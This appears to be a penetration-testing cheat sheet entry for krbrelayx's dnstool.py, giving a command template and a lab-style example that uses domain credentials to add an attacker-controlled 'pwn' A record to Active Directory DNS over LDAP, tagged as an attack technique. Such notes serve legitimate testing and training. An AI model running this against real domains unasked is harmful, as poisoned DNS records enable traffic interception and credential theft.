# dnstool

% dnstool, Active Directory, dns, ldap

## dnstool - Add  Active Directory Integrated DNS records via LDAP
#plateform/linux #target/remote #protocol/ldap #cat/ATTACK 

Example : python3 /usr/share/krbrelayx/dnstool.py -u intelligence\\foo -p password123 --action add --record pwn --data 10.10.14.19 --type A 10.10.10.248

https://github.com/dirkjanm/krbrelayx

```bash
dnstool.py -u <user> -p <password> --action add --record <name> --data <ip> --type A <server>
```
